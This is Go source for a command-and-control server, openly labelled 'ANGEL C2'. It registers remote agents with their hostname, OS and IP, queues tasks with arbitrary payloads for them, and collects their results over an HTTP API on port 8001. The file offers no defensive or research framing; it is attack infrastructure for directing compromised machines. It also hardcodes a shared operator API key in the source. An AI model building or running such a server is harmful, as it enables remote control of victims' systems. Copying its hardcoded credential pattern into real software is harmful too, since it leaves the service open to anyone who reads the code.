package main

import (
"context"
"encoding/json"
"fmt"
"net/http"
"os"
"os/signal"
"strings"
"sync"
"syscall"
"time"
)

type Agent struct {
ID       string    `json:"id"`
Hostname string    `json:"hostname"`
OS       string    `json:"os"`
IP       string    `json:"ip"`
LastSeen time.Time `json:"last_seen"`
}

type Task struct {
ID      string                 `json:"id"`
AgentID string                 `json:"agent_id"`
Type    string                 `json:"type"`
Payload map[string]interface{} `json:"payload"`
}

type Result struct {
TaskID  string                 `json:"task_id"`
AgentID string                 `json:"agent_id"`
Output  map[string]interface{} `json:"output"`
Status  string                 `json:"status"`
}

type Engine struct {
mu      sync.RWMutex
agents  map[string]*Agent
tasks   map[string]*Task
results map[string]*Result
apiKey  string
httpSrv *http.Server
}

func NewEngine() *Engine {
return &Engine{
agents:  make(map[string]*Agent),
tasks:   make(map[string]*Task),
results: make(map[string]*Result),
apiKey:  "ANGEL_OPERATOR_KEY_SL9X_2026",
}
}

func (e *Engine) auth(r *http.Request) error {
token := r.Header.Get("Authorization")
if token == "" {
return fmt.Errorf("missing token")
}
if token != "Bearer "+e.apiKey {
return fmt.Errorf("invalid token")
}
return nil
}

func (e *Engine) Start(ctx context.Context) error {
mux := http.NewServeMux()

mux.HandleFunc("/api/v1/register", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
var a Agent
if err := json.NewDecoder(r.Body).Decode(&a); err != nil {
http.Error(w, "bad json", http.StatusBadRequest)
return
}
e.mu.Lock()
a.LastSeen = time.Now().UTC()
a.IP = strings.Split(r.RemoteAddr, ":")[0]
e.agents[a.ID] = &a
e.mu.Unlock()
w.Write([]byte(`{"status":"ok"}`))
})

mux.HandleFunc("/api/v1/tasks", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
agentID := r.URL.Query().Get("agent_id")
e.mu.RLock()
var tasks []Task
for _, t := range e.tasks {
if t.AgentID == agentID {
tasks = append(tasks, *t)
}
}
e.mu.RUnlock()
w.Write(mustMarshal(tasks))
})

mux.HandleFunc("/api/v1/results", func(w http.ResponseWriter, r *http.Request) {
if err := e.auth(r); err != nil {
http.Error(w, err.Error(), http.StatusUnauthorized)
return
}
var res Result
if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
http.Error(w, "bad json", http.StatusBadRequest)
return
}
e.mu.Lock()
e.results[res.TaskID] = &res
delete(e.tasks, res.TaskID)
e.mu.Unlock()
w.Write([]byte(`{"status":"accepted"}`))
})

e.httpSrv = &http.Server{Addr: ":8001", Handler: mux}
go func() {
<-ctx.Done()
e.httpSrv.Shutdown(context.Background())
}()
fmt.Println("[+] ANGEL C2 RUNNING ON :8001")
return e.httpSrv.ListenAndServe()
}

func mustMarshal(v interface{}) []byte {
b, _ := json.Marshal(v)
return b
}

func main() {
ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
defer cancel()
engine := NewEngine()
if err := engine.Start(ctx); err != nil {
fmt.Println("[FATAL] Engine failed:", err)
os.Exit(1)
}
}
